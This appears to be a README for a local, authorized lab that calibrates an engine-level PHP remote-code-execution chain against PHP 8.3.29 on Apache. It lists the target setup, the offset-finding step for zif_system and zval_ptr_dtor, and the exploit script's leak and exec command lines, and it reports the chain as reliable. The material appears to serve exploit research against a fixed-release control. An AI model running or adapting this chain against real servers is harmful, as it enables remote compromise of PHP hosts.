# lab-8329 — PHP 8.3.29 mod_php calibration

Local, authorized lab target for extending the PHP2SHELL engine-level chain
(CVE-2026-109618/109619) from the proven `php:8.4.26-apache` profile to the
8.3 branch. `8.3.29` is inside the advisory's vulnerable range
(`8.3.* < 8.3.36`).

| Item | Value |
|---|---|
| Image | `php:8.3.29-apache` |
| OS / Apache | Debian, prefork, **one worker**, `KeepAlive Off` |
| PHP | 8.3.29 NTS, mod_php |
| ini | stock `php.ini-production` copied in by `run.sh` |
| Target page | `<?php echo "OK\n"; ?>` |
| Port | `127.0.0.1:18129` |
| Out channel | `./out` bind-mounted as `/out` |

## Usage

```
./calibrate.sh      # offsets -> target -> leak -> exec proof, all in one
```

Or step by step:

```
./offsets.sh        # libphp.so -> zif_system / zval_ptr_dtor
./run.sh            # start target on 127.0.0.1:18129
python3 ../oneshot-8426/pure_shell.py --port 18129 --zif 0x... --dtor ... --leak
python3 ../oneshot-8426/pure_shell.py --port 18129 --zif 0x... --dtor ... --exec 'id'
```

## Status

**Complete — SOLID.** Eight chain executions across five fresh ASLR
instances, plus a same-child repeat and a three-command one-shot session.
The result, parameters, and evidence manifest are in
[`RESULT.md`](RESULT.md). The 8.3.36 fixed-release control is in
[`../lab-8336/RESULT.md`](../lab-8336/RESULT.md).
